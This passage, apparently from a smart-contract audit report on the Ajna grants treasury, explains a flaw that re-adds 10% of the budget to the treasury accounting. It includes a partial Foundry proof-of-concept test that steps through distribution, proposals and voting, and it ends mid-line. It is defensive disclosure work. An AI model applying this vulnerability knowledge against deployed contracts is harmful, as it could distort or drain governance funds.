class=\"grvsc-source\"><span class=\"mtk7\">208</span><span class=\"mtk1\">:        </span><span class=\"mtk15\">for</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">0</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk12\">numFundedProposals</span><span class=\"mtk1\">; ) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">209</span><span class=\"mtk1\">:            </span><span class=\"mtk12\">Proposal</span><span class=\"mtk1\"> </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">proposal</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">_standardFundingProposals</span><span class=\"mtk1\">[</span><span class=\"mtk12\">fundingProposalIds</span><span class=\"mtk1\">[</span><span class=\"mtk12\">i</span><span class=\"mtk1\">]];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">210</span><span class=\"mtk1\">:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">211</span><span class=\"mtk1\">:            </span><span class=\"mtk12\">totalTokensRequested</span><span class=\"mtk1\"> += </span><span class=\"mtk12\">proposal</span><span class=\"mtk1\">.</span><span class=\"mtk12\">tokensRequested</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">212</span><span class=\"mtk1\">:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">213</span><span class=\"mtk1\">:            </span><span class=\"mtk12\">unchecked</span><span class=\"mtk1\"> { ++</span><span class=\"mtk12\">i</span><span class=\"mtk1\">; }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">214</span><span class=\"mtk1\">:        }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">215</span><span class=\"mtk1\">:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">216</span><span class=\"mtk1\">:        </span><span class=\"mtk3\">// readd non distributed tokens to the treasury</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">217</span><span class=\"mtk1\">:        </span><span class=\"mtk12\">treasury</span><span class=\"mtk1\"> += (</span><span class=\"mtk12\">fundsAvailable</span><span class=\"mtk1\"> - </span><span class=\"mtk12\">totalTokensRequested</span><span class=\"mtk1\">);</span></span></span></code></pre>\n<p>In the code block above, <code>fundsAvailable</code> represents 100% of the GBC and <code>totalTokensRequested</code> represents up to 90% of the GBC. As a result, the treasury always adds 10% of the reserve back to its accounting.</p>\n<h3 id=\"proof-of-concept-3\" style=\"position:relative;\"><a href=\"#proof-of-concept-3\" aria-label=\"proof of concept 3 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>The following PoC code is quite long because it must go through all stages. Please append and run this function in the file <code>ajna-grants/test/unit/StandardFunding.t.sol</code>. The test should pass without errors.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"12\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">ajna</span><span class=\"mtk1\">-</span><span class=\"mtk12\">grants</span><span class=\"mtk1\">/</span><span class=\"mtk12\">test</span><span class=\"mtk1\">/</span><span class=\"mtk12\">unit</span><span class=\"mtk1\">/</span><span class=\"mtk12\">StandardFunding</span><span class=\"mtk1\">.</span><span class=\"mtk12\">t</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">/*</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">        1. startDistributionPeriod</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">        2. proposeStandard</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">        3. screeningVote</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">        4. fundingVote</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">        5. updateSlate</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">        6. executeStandard</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">        7. claimDelegateReward</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">    */</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">testPoCTreasuryPrecisionLoss</span><span class=\"mtk1\">() </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// 14 tokenholders self delegate their tokens to enable voting on the proposals</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">_selfDelegateVoters</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_token</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_votersArr</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">allVotersInitBalance</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">50_000_000</span><span class=\"mtk1\"> * </span><span class=\"mtk7\">1e18</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">emit</span><span class=\"mtk1\"> </span><span class=\"mtk11\">log_named_uint</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;Treasury initial amount&quot;</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_grantFund</span><span class=\"mtk1\">.</span><span class=\"mtk11\">treasury</span><span class=\"mtk1\">());</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">roll</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_startBlock</span><span class=\"mtk1\"> + </span><span class=\"mtk7\">150</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">/* =========================</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">        1. startDistributionPeriod()</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">        ========================= */</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">assertEq</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_token</span><span class=\"mtk1\">.</span><span class=\"mtk11\">balanceOf</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_grantFund</span><span class=\"mtk1\">)), </span><span class=\"mtk7\">500_000_000</span><span class=\"mtk1\"> * </span><span class=\"mtk7\">1e18</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;No token should have left the treasury&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint24</span><span class=\"mtk1\"> </span><span class=\"mtk12\">distributionId</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">_grantFund</span><span class=\"mtk1\">.</span><span class=\"mtk11\">startNewDistributionPeriod</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">assertEq</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_grantFund</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getDistributionId</span><span class=\"mtk1\">(), </span><span class=\"mtk12\">distributionId</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;Should have the same ID&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">oldTreasury</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">_grantFund</span><span class=\"mtk1\">.</span><span class=\"mtk11\">treasury</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">emit</span><span class=\"mtk1\"> </span><span class=\"mtk11\">log_named_uint</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;Treasury after start, deduct 3%&quot;</span><span class=\"mtk1\">, </span><span class=\"mtk12\">oldTreasury</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        (, , , </span><span class=\"mtk12\">uint128</span><span class=\"mtk1\"> </span><span class=\"mtk12\">gbc</span><span class=\"mtk1\">, , ) = </span><span class=\"mtk12\">_grantFund</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getDistributionPeriodInfo</span><span class=\"mtk1\">(</span><span class=\"mtk12\">distributionId</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">assertEq</span><span class=\"mtk1\">(</span><span class=\"mtk12\">gbc</span><span class=\"mtk1\">, </span><span class=\"mtk7\">15_000_000</span><span class=\"mtk1\"> * </span><span class=\"mtk7\">1e18</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">emit</span><span class=\"mtk1\"> </span><span class=\"mtk11\">log_named_uint</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;GBC&quot;</span><span class=\"mtk1\">, </span><span class=\"mtk11\">uint</span><span class=\"mtk1\">(</span><span class=\"mtk12\">gbc</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">assertEq</span><span class=\"mtk1\">(</span><span class=\"mtk12\">oldTreasury</span><span class=\"mtk1\"> + </span><span class=\"mtk12\">gbc</span><span class=\"mtk1\">, </span><span class=\"mtk7\">500_000_000</span><span class=\"mtk1\"> * </span><span class=\"mtk7\">1e18</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;Should be equal to the initial treasury fund&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">/* =================</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">        2. proposeStandard()</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">        ================= */</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// Request 9/10 of GBC (maximal)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// 9/10 of GBC = 13_500_000 == 8_500_000 + 5_000_000 (all in WAD uint)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">TestProposalParams</span><span class=\"mtk1\">[] </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">testProposalParams</span><span class=\"mtk1\"> = </span><span class=\"mtk4\">new</span><span class=\"mtk1\"> </span><span class=\"mtk10\">TestProposalParams</span><span class=\"mtk1\">[](</span><span class=\"mtk7\">2</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">testProposalParams</span><span class=\"mtk1\">[</span><span class=\"mtk7\">0</span><span class=\"mtk1\">] = </span><span class=\"mtk11\">TestProposalParams</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">), </span><span class=\"mtk7\">8_500_000</span><span class=\"mtk1\"> * </span><span class=\"mtk7\">1e18</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">testProposalParams</span><span class=\"mtk1\">[</span><span class=\"mtk7\">1</span><span class=\"mtk1\">] = </span><span class=\"mtk11\">TestProposalParams</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">), </span><span class=\"mtk7\">5_000_000</span><span class=\"mtk1\"> * </span><span class=\"mtk7\">1e18</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">TestProposal</span><span class=\"mtk1\">[] </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">testProposals</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">_createNProposals</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_grantFund</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_token</span><span class=\"mtk1\">, </span><span class=\"mtk12\">testProposalParams</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">assertEq</span><span class=\"mtk1\">(</span><span class=\"mtk12\">testProposals</span><span class=\"mtk1\">.</span><span class=\"mtk12\">length</span><span class=\"mtk1\">, </span><span class=\"mtk7\">2</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;Should created exact 2 proposals&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">roll</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_startBlock</span><span class=\"mtk1\"> + </span><span class=\"mtk7\">200</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">/* ===============</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">        3. screeningVote()</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">        =============== */</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// Demonstrate only 6 voters, all fully use their vote power (50_000_000 * 1e18)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// #0 got 2 votes</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// #1 got 4 votes</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">_screeningVote</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_grantFund</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_tokenHolder1</span><span class=\"mtk1\">, </span><span class=\"mtk12\">testProposals</span><span class=\"mtk1\">[</span><span class=\"mtk7\">0</span><span class=\"mtk1\">].</span><span class=\"mtk12\">proposalId</span><span class=\"mtk1\">, </span><span class=\"mtk11\">_getScreeningVotes</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_grantFund</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_tokenHolder1</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">_screeningVote</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_grantFund</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_tokenHolder2</span><span class=\"mtk1\">, </span><span class=\"mtk12\">testProposals</span><span class=\"mtk1\">[</span><span class=\"mtk7\">0</span><span class=\"mtk1\">].</span><span class=\"mtk12\">proposalId</span><span class=\"mtk1\">, </span><span class=\"mtk11\">_getScreeningVotes</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_grantFund</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_tokenHolder2</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">_screeningVote</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_grantFund</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_tokenHolder3</span><span class=\"mtk1\">, </span><span class=\"mtk12\">testProposals</span><span class=\"mtk1\">[</span><span class=\"mtk7\">1</span><span class=\"mtk1\">].</span><span class=\"mtk12\">proposalId</span><span class=\"mtk1\">, </span><span class=\"mtk11\">_getScreeningVotes</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_grantFund</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_tokenHolder3</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">_screeningVote</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_grantFund</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_tokenHolder4</span><span class=\"mtk1\">, </span><span class=\"mtk12\">testProposals</span><span class=\"mtk1\">[</span><span class=\"mtk7\">1</span><span class=\"mtk1\">].</span><span class=\"mtk12\">proposalId</span><span class=\"mtk1\">, </span><span class=\"mtk11\">_getScreeningVotes</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_grantFund</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_tokenHolder4</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">_screeningVote</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_grantFund</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_tokenHolder5</span><span class=\"mtk1\">, </span><span class=\"mtk12\">testProposals</span><span class=\"mtk1\">[</span><span class=\"mtk7\">1</span><span class=\"mtk1\">].</span><span class=\"mtk12\">proposalId</span><span class=\"mtk1\">, </span><span class=\"mtk11\">_getScreeningVotes</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_grantFund</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_tokenHolder5</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">_screeningVote</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_grantFund</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_tokenHolder6</span><span class=\"mtk1\">, </span><span class=\"mtk12\">testProposals</span><span class=\"mtk1\">[</span><span class=\"mtk7\">1</span><span class=\"mtk1\">].</span><span class=\"mtk12\">proposalId</span><span class=\"mtk1\">, </span><span class=\"mtk11\">_getScreeningVotes</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_grantFund</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_tokenHolder6</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// /* =============</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// 4. fundingVote()</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// ============= */</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// skip time to move from screening period to funding period</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">roll</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_startBlock</span><span class=\"mtk1\"> + </span><span class=\"mtk7\">600_000</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">GrantFund</span><span class=\"mtk1\">.</span><span class=\"mtk12\">Proposal</span><span class=\"mtk1\">[] </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">proposals</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">_getProposalListFromProposalIds</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_grantFund</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_grantFund</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getTopTenProposals</span><span class=\"mtk1\">(</span><span class=\"mtk12\">distributionId</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">assertEq</span><span class=\"mtk1\">(</span><span class=\"mtk12\">proposals</span><span class=\"mtk1\">.</span><span class=\"mtk12\">length</span><span class=\"mtk1\">, </span><span class=\"mtk7\">2</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// Proposals should be sorted descending according to votes received so #1 should be the first and #0 should be the second</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">assertEq</span><span class=\"mtk1\">(</span><span class=\"mtk12\">proposals</span><span class=\"mtk1\">[</span><span class=\"mtk7\">0</span><span class=\"mtk1\">].</span><span class=\"mtk12\">proposalId</span><span class=\"mtk1\">, </span><span class=\"mtk12\">testProposals</span><span class=\"mtk1\">[</span><span class=\"mtk7\">1</span><span class=\"mtk1\">].</span><span class=\"mtk12\">proposalId</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;Should have the correct proposalId #1&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">assertEq</span><span class=\"mtk1\">(</span><span class=\"mtk12\">proposals</span><span class=\"mtk1\">[</span><span class=\"mtk7\">0</span><span class=\"mtk1\">].</span><span class=\"mtk12\">votesReceived</span><span class=\"mtk1\">, </span><span class=\"mtk7\">200_000_000</span><span class=\"mtk1\"> * </span><span class=\"mtk7\">1e18</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;Should have the voting score of 4 voters&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">assertEq</span><span class=\"mtk1\">(</span><span class=\"mtk12\">proposals</span><span class=\"mtk1\">[</span><span class=\"mtk7\">1</span><span class=\"mtk1\">].</span><span class=\"mtk12\">proposalId</span><span class=\"mtk1\">, </span><span class=\"mtk12\">testProposals</span><span class=\"mtk1\">[</span><span class=\"mtk7\">0</span><span class=\"mtk1\">].</span><span class=\"mtk12\">proposalId</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;Should have the correct proposalId #0&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">assertEq</span><span class=\"mtk1\">(</span><span class=\"mtk12\">proposals</span><span class=\"mtk1\">[</span><span class=\"mtk7\">1</span><span class=\"mtk1\">].</span><span class=\"mtk12\">votesReceived</span><span class=\"mtk1\">, </span><span class=\"mtk7\">100_000_000</span><span class=\"mtk1\"> * </span><span class=\"mtk7\">1e18</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;Should have the voting score of 2 voters&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// funding period votes for two competing slates, 1, or 2 and 3</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// #1 got 3 funding votes</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// #0 got 3 funding votes</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">_fundingVote</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_grantFund</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_tokenHolder1</span><span class=\"mtk1\">, </span><span class=\"mtk12\">proposals</span><span class=\"mtk1\">[</span><span class=\"mtk7\">0</span><span class=\"mtk1\">].</span><span class=\"mtk12\">proposalId</span><span class=\"mtk1\">, </span><span class=\"mtk12\">voteYes</span><span class=\"mtk1\">, </span><span class=\"mtk7\">50_000_000</span><span class=\"mtk1\"> * </span><span class=\"mtk7\">1e18</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">_fundingVote</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_grantFund</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_tokenHolder2</span><span class=\"mtk1\">, </span><span class=\"mtk12\">proposals</span><span class=\"mtk1\">[</span><span class=\"mtk7\">1</span><span class=\"mtk1\">].</span><span class=\"mtk12\">proposalId</span><span class=\"mtk1\">, </span><span class=\"mtk12\">voteYes</span><span class=\"mtk1\">, </span><span class=\"mtk7\">50_000_000</span><span class=\"mtk1\"> * </span><span class=\"mtk7\">1e18</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">_fundingVote</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_grantFund</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_tokenHolder3</span><span class=\"mtk1\">, </span><span class=\"mtk12\">proposals</span><span class=\"mtk1\">[</span><span class=\"mtk7\">1</span><span class=\"mtk1\">].</span><span class=\"mtk12\">proposalId</span><span class=\"mtk1\">, </span><span class=\"mtk12\">voteYes</span><span class=\"mtk1\">, </span><span class=\"mtk7\">50_000_000</span><span class=\"mtk1\"> * </span><span class=\"mtk7\">1e18</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">_fundingVote</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_grantFund</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_tokenHolder4</span><span class=\"mtk1\">, </span><span class=\"mtk12\">proposals</span><span class=\"mtk1\">[</span><span class=\"mtk7\">1</span><span class=\"mtk1\">].</span><span class=\"mtk12\">proposalId</span><span class=\"mtk1\">, </span><span class=\"mtk12\">voteYes</span><span class=\"mtk1\">, </span><span class=\"mtk7\">50_000_000</span><span class=\"mtk1\"> * </span><span class=\"mtk7\">1e18</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">_fundingVote</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_grantFund</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_tokenHolder5</span><span class=\"mtk1\">, </span><span class=\"mtk12\">proposals</span><span class=\"mtk1\">[</span><span class=\"mtk7\">0</span><span 